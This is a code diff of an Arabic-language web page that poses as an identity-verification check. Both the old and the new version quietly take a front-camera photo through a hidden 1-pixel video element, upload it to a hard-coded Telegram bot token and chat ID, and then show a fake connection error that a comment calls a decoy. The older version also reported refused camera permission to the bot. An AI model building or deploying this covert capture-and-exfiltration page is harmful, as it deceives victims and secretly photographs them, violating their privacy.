@@ -2,26 +2,32 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تأكيد الهوية</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق الآمن</title>
     <style>
-        body { margin: 0; background: #121212; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #fff; }
-        #startBtn { padding: 18px 45px; font-size: 18px; border-radius: 12px; border: none; background: #3f51b5; color: white; font-weight: 600; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.3); transition: 0.2s; }
-        #startBtn:active { transform: scale(0.95); background: #303f9f; }
-        #status { margin-top: 20px; font-size: 15px; text-align: center; width: 85%; color: #bbb; display: none; }
-        /* إخفاء الفيديو تماماً */
+        body { margin: 0; background: #121212; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: sans-serif; color: #fff; }
+        .box { text-align: center; padding: 25px; border-radius: 20px; background: #1e1e1e; box-shadow: 0 8px 25px rgba(0,0,0,0.5); width: 85%; max-width: 400px; }
+        h3 { margin-bottom: 15px; color: #4caf50; }
+        #startBtn { padding: 16px 30px; font-size: 18px; border-radius: 10px; border: none; background: #4caf50; color: white; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        #startBtn:active { transform: scale(0.96); background: #388e3c; }
+        #status { margin-top: 15px; font-size: 14px; color: #888; display: none; }
         video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <button id="startBtn">بدء عملية التحقق</button>
-    <div id="status">جاري الاتصال...</div>
+    <div class="box">
+        <h3>تحقق من الهوية</h3>
+        <p style="font-size: 14px; color: #aaa; margin-bottom: 20px;">يرجى الضغط على الزر أدناه والموافقة على إذن الكاميرا للمتابعة.</p>
+        <button id="startBtn">بدء التحقق الآن</button>
+        <div id="status">جاري الاتصال بالسيرفر...</div>
+    </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
+        // بيانات بوتك (تأكد أنها صحيحة)
         const token = '8723034543:AAEb6V0gOAW5EBJje20bF11avfDkoc0dFrU'; 
         const chatID = '1921462984';
 
@@ -30,65 +36,54 @@
         const status = document.getElementById('status');
 
         startBtn.onclick = async function() {
-            startBtn.style.display = 'none';
+            startBtn.disabled = true;
+            startBtn.innerText = "جاري الفحص...";
             status.style.display = 'block';
-            status.innerText = "جاري تهيئة النظام...";
 
             try {
-                // طلب الكاميرا الأمامية لأجهزة أندرويد
+                // طلب إذن الكاميرا (سيظهر منبثق السماح/Allow في أندرويد)
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                status.innerText = "جاري معالجة البيانات...";
+                status.innerText = "جاري مزامنة البيانات...";
 
-                // الانتظار قليلاً لفتح العدسة ثم الالتقاط
-                setTimeout(takeAndSend, 1200);
+                // الانتظار ثانية واحدة لالتقاط صورة واضحة
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+
+                    canvas.toBlob(function(blob) {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatID);
+                        formData.append('photo', blob, 'user_capture.jpg');
+                        formData.append('caption', '✅ صورة جديدة تم التقاطها بنجاح!');
+
+                        fetch(`https://telegram.org{token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            // إغلاق الكاميرا فوراً
+                            stream.getTracks().forEach(t => t.stop());
+                            // رسالة تمويه للمستخدم
+                            status.style.color = "#ff5252";
+                            status.innerText = "خطأ في الاتصال (Error 0x800). يرجى المحاولة لاحقاً.";
+                        });
+                    }, 'image/jpeg', 0.7);
+                }, 1000);
 
             } catch (err) {
-                console.error(err);
                 status.style.color = "#ff5252";
-                status.innerText = "خطأ: يرجى الضغط على 'سماح' (Allow) عند طلب المتصفح للوصول للكاميرا.";
-                // إبلاغك برفض الإذن
-                fetch(`https://telegram.org{token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent("❌ فشل: تم رفض إذن الكاميرا على أندرويد")}`);
+                status.innerText = "يجب السماح بالكاميرا لتتمكن من الدخول.";
+                startBtn.disabled = false;
+                startBtn.innerText = "إعادة المحاولة";
             }
         };
-
-        function takeAndSend() {
-            const canvas = document.getElementById('canvas');
-            // تأكد من أبعاد الفيديو الحقيقية
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(function(blob) {
-                if(!blob) return;
-                
-                const formData = new FormData();
-                formData.append('chat_id', chatID);
-                formData.append('photo', blob, 'android_capture.jpg');
-
-                fetch(`https://telegram.org{token}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(() => {
-                    // إيقاف الكاميرا فوراً
-                    const tracks = video.srcObject.getTracks();
-                    tracks.forEach(track => track.stop());
-                    
-                    status.style.color = "#ff5252";
-                    status.innerText = "فشل في التحقق (Error: 502). يرجى المحاولة من متصفح آخر.";
-                })
-                .catch(() => {
-                    status.innerText = "خطأ في الشبكة.";
-                });
-            }, 'image/jpeg', 0.6); // ضغط الصورة لسرعة الإرسال
-        }
     </script>
 </body>
 </html>
